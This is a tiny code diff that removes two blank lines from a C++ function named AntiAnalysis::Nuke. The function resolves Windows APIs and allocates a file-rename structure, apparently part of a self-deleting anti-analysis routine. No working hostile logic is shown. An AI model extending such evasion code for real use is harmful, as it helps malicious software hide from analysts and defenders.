@@ -69,8 +69,6 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
 
     auto resolve = resolver.GetAPIAccess();
 
-
-
     pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
 
     if (!pRename) 
